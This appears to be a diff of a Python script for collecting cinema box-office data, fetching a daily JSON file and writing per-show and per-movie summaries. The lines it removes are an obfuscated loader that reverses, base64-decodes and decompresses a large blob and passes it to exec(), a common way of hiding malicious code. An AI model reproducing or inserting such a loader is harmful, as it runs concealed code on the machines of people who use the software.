@@ -1,2 +1,431 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import json, os, hashlib
+from datetime import datetime, timedelta
+from urllib.request import Request, urlopen
+from urllib.error import HTTPError, URLError
+import pytz
+
+SHARD_ID = 9
+SOURCE_BASE_URL = "https://districtdata2026.pages.dev/boxoffice"
+DISTRICT_VENUES_FILE = "districtvenues.json"
+ALL_DISTRICT_VENUES_FILE = "alldistrictvenues.json"
+REQUEST_TIMEOUT = 30
+CUTOFF_MINUTES = 20000
+IST = pytz.timezone("Asia/Kolkata")
+
+NOW_IST = datetime.now(IST)
+DATE_CODE = NOW_IST.strftime("%Y%m%d")
+DATE_DISTRICT = NOW_IST.strftime("%Y-%m-%d")
+BASE_DIR = os.path.join("daily", "data", DATE_CODE)
+LOG_DIR = os.path.join(BASE_DIR, "logs")
+os.makedirs(LOG_DIR, exist_ok=True)
+DETAILED_FILE = os.path.join(BASE_DIR, f"detailed{SHARD_ID}.json")
+SUMMARY_FILE = os.path.join(BASE_DIR, f"movie_summary{SHARD_ID}.json")
+LOG_FILE = os.path.join(LOG_DIR, f"districtdaily{SHARD_ID}.log")
+
+def log(message):
+    timestamp = datetime.now(IST).strftime("%H:%M:%S")
+    line = f"[{timestamp}] {message}"
+    print(line, flush=True)
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(line + "\n")
+    except Exception:
+        pass
+
+def load_json_file(path):
+    with open(path, "r", encoding="utf-8") as f:
+        return json.load(f)
+
+def normalize_venue_name(value):
+    if value is None:
+        return ""
+    value = str(value)
+    value = " ".join(value.split())
+    return value.strip().casefold()
+
+def load_and_match_venues():
+    district_venues = load_json_file(DISTRICT_VENUES_FILE)
+    all_venues = load_json_file(ALL_DISTRICT_VENUES_FILE)
+    log(f"📍 Selected venue IDs: {len(district_venues)}")
+    log(f"📍 Master venue records: {len(all_venues)}")
+    master_by_id = {}
+    for venue in all_venues:
+        if not isinstance(venue, dict):
+            continue
+        venue_id = venue.get("id")
+        if venue_id is None:
+            continue
+        master_by_id[str(venue_id)] = venue
+    selected_master = []
+    missing_ids = []
+    missing_names = []
+    for selected in district_venues:
+        if not isinstance(selected, dict):
+            continue
+        selected_id = selected.get("id")
+        if selected_id is None:
+            continue
+        master = master_by_id.get(str(selected_id))
+        if master is None:
+            missing_ids.append(selected_id)
+            continue
+        official_name = str(master.get("name", "") or "").strip()
+        if not official_name:
+            missing_names.append(selected_id)
+            continue
+        selected_master.append({
+            "selected_id": selected_id,
+            "master_id": master.get("id"),
+            "name": official_name,
+            "address": str(master.get("address", "") or ""),
+            "city": str(master.get("city", "Unknown") or "Unknown"),
+            "state": str(master.get("state", "Unknown") or "Unknown"),
+            "chainKey": str(master.get("chainKey", "Unknown") or "Unknown")
+        })
+    log(f"✅ ID → ID matched: {len(selected_master)}")
+    log(f"⚠️ IDs missing from master: {len(missing_ids)}")
+    log(f"⚠️ Master records without name: {len(missing_names)}")
+    if missing_ids:
+        for venue_id in missing_ids[:20]:
+            log(f"   ❌ Master ID missing: {venue_id}")
+        if len(missing_ids) > 20:
+            log(f"   ... and {len(missing_ids) - 20} more")
+    if missing_names:
+        for venue_id in missing_names[:20]:
+            log(f"   ❌ No master name: {venue_id}")
+        if len(missing_names) > 20:
+            log(f"   ... and {len(missing_names) - 20} more")
+    return selected_master
+
+def format_state(value):
+    if not value:
+        return "Unknown"
+    return " ".join(word.capitalize() for word in str(value).replace("-", " ").split())
+
+def format_chain(value):
+    if not value:
+        return "Unknown"
+    return " ".join(word.capitalize() for word in str(value).replace("-", " ").split())
+
+def normalize_movie_name(value):
+    if value is None:
+        return ""
+    return " ".join(str(value).split()).strip()
+
+def build_movie_key(movie_name, language):
+    movie_name = normalize_movie_name(movie_name)
+    language = str(language or "").strip()
+    if not language:
+        language = "Unknown"
+    return f"{movie_name} [2D | {language}]"
+
+def generate_session_id(movie, venue, time, audi):
+    raw = "|".join([str(movie), str(venue), str(time), str(audi)])
+    digest = hashlib.sha1(raw.encode("utf-8")).hexdigest()[:16]
+    return f"DISTRICT_{digest}"
+
+def calculate_minutes_left(show_time):
+    try:
+        now = datetime.now(IST)
+        t = datetime.strptime(show_time, "%I:%M %p")
+        show_dt = now.replace(hour=t.hour, minute=t.minute, second=0, microsecond=0)
+        if show_dt < now - timedelta(hours=6):
+            show_dt += timedelta(days=1)
+        return (show_dt - now).total_seconds() / 60
+    except Exception:
+        return 9999
+
+def fetch_source():
+    url = f"{SOURCE_BASE_URL}/{DATE_DISTRICT}_Detailed.json"
+    log("📡 Fetching Detailed JSON:")
+    log(f"   {url}")
+    request = Request(url, headers={"User-Agent": "Mozilla/5.0 (compatible; BMS9/1.0)"})
+    try:
+        with urlopen(request, timeout=REQUEST_TIMEOUT) as response:
+            raw = response.read()
+        data = json.loads(raw.decode("utf-8"))
+        if not isinstance(data, dict):
+            raise ValueError("Source JSON is not an object")
+        if "dicts" not in data:
+            raise ValueError("Missing dicts")
+        if "movies" not in data:
+            raise ValueError("Missing movies")
+        log("✅ Source loaded")
+        log(f"   Source date: {data.get('date')}")
+        log(f"   Last updated: {data.get('lastUpdated')}")
+        log(f"   Movie keys: {len(data.get('movies', {}))}")
+        return data
+    except HTTPError as e:
+        if e.code == 404:
+            log("❌ Source file not found (404) – will create empty outputs")
+        else:
+            log(f"❌ HTTP {e.code} – will create empty outputs")
+        return None
+    except URLError as e:
+        log(f"❌ URL error: {e.reason} – will create empty outputs")
+        return None
+    except Exception as e:
+        log(f"❌ Source error: {type(e).__name__}: {e} – will create empty outputs")
+        return None
+
+def reverse_dictionary(dictionary):
+    if not isinstance(dictionary, dict):
+        return {}
+    return {int(value): key for key, value in dictionary.items()}
+
+def build_reverse_dicts(source):
+    dicts = source.get("dicts", {})
+    return {
+        "cities": reverse_dictionary(dicts.get("cities", {})),
+        "states": reverse_dictionary(dicts.get("states", {})),
+        "venues": reverse_dictionary(dicts.get("venues", {})),
+        "chains": reverse_dictionary(dicts.get("chains", {})),
+        "showtimes": reverse_dictionary(dicts.get("showtimes", {})),
+        "audis": reverse_dictionary(dicts.get("audis", {}))
+    }
+
+def build_source_venue_lookup(reverse):
+    lookup = {}
+    source_venues = reverse["venues"]
+    for source_id, source_name in source_venues.items():
+        normalized = normalize_venue_name(source_name)
+        if not normalized:
+            continue
+        lookup[normalized] = {"source_id": source_id, "source_name": source_name}
+    return lookup
+
+def match_master_to_source(selected_master, source_venue_lookup):
+    matched = {}
+    unmatched = []
+    for venue in selected_master:
+        master_name = venue["name"]
+        normalized = normalize_venue_name(master_name)
+        source_match = source_venue_lookup.get(normalized)
+        if source_match is None:
+            unmatched.append({"master_id": venue["master_id"], "name": master_name})
+            continue
+        source_id = source_match["source_id"]
+        matched[source_id] = {
+            **venue,
+            "source_id": source_id,
+            "source_name": source_match["source_name"]
+        }
+    log(f"🎯 Master-name → Source-name matches: {len(matched)}")
+    log(f"⚠️ Master venues not found in source: {len(unmatched)}")
+    if unmatched:
+        for item in unmatched[:20]:
+            log(f"   ❌ {item['master_id']} → {item['name']}")
+        if len(unmatched) > 20:
+            log(f"   ... and {len(unmatched) - 20} more")
+    return matched
+
+def decompress_show(row, reverse):
+    if not isinstance(row, list) or len(row) < 12:
+        return None
+    try:
+        city_id, state_id, venue_id, chain_id, time_id, audi_id = row[0], row[1], row[2], row[3], row[4], row[5]
+        total = int(row[6] or 0)
+        available = int(row[7] or 0)
+        sold = int(row[8] or 0)
+        gross_cents = int(row[9] or 0)
+        occupancy_raw = int(row[10] or 0)
+        mins_left = float(row[11] or 0)
+        return {
+            "city": reverse["cities"].get(city_id, "Unknown"),
+            "state": reverse["states"].get(state_id, "Unknown"),
+            "venue": reverse["venues"].get(venue_id, "Unknown"),
+            "venue_id": venue_id,
+            "chain": reverse["chains"].get(chain_id, "Unknown"),
+            "time": reverse["showtimes"].get(time_id, ""),
+            "audi": reverse["audis"].get(audi_id, ""),
+            "totalSeats": total,
+            "available": available,
+            "sold": sold,
+            "gross": gross_cents / 100,
+            "occupancy": occupancy_raw / 100,
+            "minsLeft": mins_left
+        }
+    except Exception:
+        return None
+
+def parse_source(source, matched_venues, reverse):
+    detailed = []
+    movies = source.get("movies", {})
+    total_movie_keys = len(movies)
+    matched_rows = 0
+    ignored_rows = 0
+    for raw_movie_key, rows in movies.items():
+        if not isinstance(rows, list):
+            continue
+        if "|" in raw_movie_key:
+            parts = [p.strip() for p in raw_movie_key.split("|")]
+            movie_name = parts[0] if parts else raw_movie_key
+            language = parts[-1] if len(parts) > 1 else "Unknown"
+        else:
+            movie_name = raw_movie_key.strip()
+            language = "Unknown"
+        movie_key = build_movie_key(movie_name, language)
+        for compressed in rows:
+            show = decompress_show(compressed, reverse)
+            if not show:
+                continue
+            source_venue_id = show["venue_id"]
+            selected_venue = matched_venues.get(source_venue_id)
+            if selected_venue is None:
+                ignored_rows += 1
+                continue
+            matched_rows += 1
+            city = selected_venue.get("city") or "Unknown"
+            state = format_state(selected_venue.get("state"))
+            venue = selected_venue["name"]
+            address = selected_venue.get("address") or ""
+            chain = format_chain(selected_venue.get("chainKey"))
+            time = str(show.get("time", "") or "").strip()
+            audi = str(show.get("audi", "") or "")
+            mins_left = calculate_minutes_left(time)
+            if mins_left > CUTOFF_MINUTES:
+                continue
+            total = int(show.get("totalSeats", 0) or 0)
+            available = int(show.get("available", 0) or 0)
+            sold = total - available
+            if sold < 0:
+                sold = 0
+            gross = float(show.get("gross", 0) or 0)
+            session_id = generate_session_id(movie_key, venue, time, audi)
+            detailed.append({
+                "movie": movie_key,
+                "city": city,
+                "state": state,
+                "venue": venue,
+                "address": address,
+                "time": time,
+                "audi": audi,
+                "session_id": session_id,
+                "totalSeats": total,
+                "available": available,
+                "sold": sold,
+                "gross": round(gross, 2),
+                "minsLeft": round(mins_left, 1),
+                "source": "District",
+                "date": DATE_CODE,
+                "chain": chain
+            })
+    log(f"🎬 Source movie keys: {total_movie_keys}")
+    log(f"🎟️ Selected-venue show rows: {matched_rows}")
+    log(f"🚫 Non-selected show rows ignored: {ignored_rows}")
+    return detailed
+
+def show_key(row):
+    return (row.get("venue"), row.get("time"), row.get("session_id"), row.get("audi"))
+
+def load_old_detailed():
+    if not os.path.exists(DETAILED_FILE):
+        return []
+    try:
+        with open(DETAILED_FILE, "r", encoding="utf-8") as f:
+            old = json.load(f)
+        if isinstance(old, list):
+            return old
+    except Exception as e:
+        log(f"⚠️ Could not load old detailed file: {e}")
+    return []
+
+def merge_without_deleting(fresh):
+    old_rows = load_old_detailed()
+    old_map = {show_key(row): row for row in old_rows if isinstance(row, dict)}
+    new_map = {}
+    for row in fresh:
+        key = show_key(row)
+        if key in old_map:
+            old_map[key].update({
+                "totalSeats": row["totalSeats"],
+                "available": row["available"],
+                "sold": row["sold"],
+                "gross": row["gross"],
+                "minsLeft": row["minsLeft"]
+            })
+            new_map[key] = old_map[key]
+        else:
+            new_map[key] = row
+    for key, row in old_map.items():
+        if key not in new_map:
+            new_map[key] = row
+    merged = list(new_map.values())
+    log(f"📦 Previous shows: {len(old_rows)}")
+    log(f"🆕 Fresh shows: {len(fresh)}")
+    log(f"📦 Final shows: {len(merged)}")
+    return merged
+
+def build_summary(detailed):
+    summary = {}
+    for row in detailed:
+        movie = row.get("movie", "Unknown")
+        city = row.get("city", "Unknown")
+        venue = row.get("venue", "Unknown")
+        total = int(row.get("totalSeats", 0) or 0)
+        sold = int(row.get("sold", 0) or 0)
+        gross = float(row.get("gross", 0) or 0)
+        occupancy = (sold / total * 100) if total else 0
+        if movie not in summary:
+            summary[movie] = {
+                "shows": 0, "gross": 0.0, "sold": 0, "totalSeats": 0,
+                "venues": set(), "cities": set(), "fastfilling": 0, "housefull": 0
+            }
+        m = summary[movie]
+        m["shows"] += 1
+        m["gross"] += gross
+        m["sold"] += sold
+        m["totalSeats"] += total
+        m["venues"].add(venue)
+        m["cities"].add(city)
+        if occupancy >= 98:
+            m["housefull"] += 1
+        elif occupancy >= 50:
+            m["fastfilling"] += 1
+    return {
+        movie: {
+            "shows": m["shows"],
+            "gross": round(m["gross"], 2),
+            "sold": m["sold"],
+            "totalSeats": m["totalSeats"],
+            "venues": len(m["venues"]),
+            "cities": len(m["cities"]),
+            "fastfilling": m["fastfilling"],
+            "housefull": m["housefull"],
+            "occupancy": round((m["sold"] / m["totalSeats"] * 100) if m["totalSeats"] else 0.0, 2)
+        }
+        for movie, m in summary.items()
+    }
+
+def save_json(path, data):
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+def main():
+    log("🚀 DISTRICT → OLD BMS9 CONVERTER STARTED")
+    log(f"📅 Date: {DATE_DISTRICT}")
+    log("🚫 Worker logic: DISABLED")
+    selected_master = load_and_match_venues()
+    source = fetch_source()
+    if source is None:
+        log("⚠️ No source data – saving empty JSON files")
+        save_json(DETAILED_FILE, [])
+        save_json(SUMMARY_FILE, {})
+        log(f"✅ DONE (empty) | Shows=0 | Movies=0")
+        log(f"📄 Detailed: {DETAILED_FILE}")
+        log(f"📄 Summary: {SUMMARY_FILE}")
+        return
+    reverse = build_reverse_dicts(source)
+    source_venue_lookup = build_source_venue_lookup(reverse)
+    matched_venues = match_master_to_source(selected_master, source_venue_lookup)
+    fresh = parse_source(source, matched_venues, reverse)
+    detailed = merge_without_deleting(fresh)
+    summary = build_summary(detailed)
+    save_json(DETAILED_FILE, detailed)
+    save_json(SUMMARY_FILE, summary)
+    log(f"✅ DONE | Shows={len(detailed)} | Movies={len(summary)}")
+    log(f"📄 Detailed: {DETAILED_FILE}")
+    log(f"📄 Summary: {SUMMARY_FILE}")
+
+if __name__ == "__main__":
+    main()
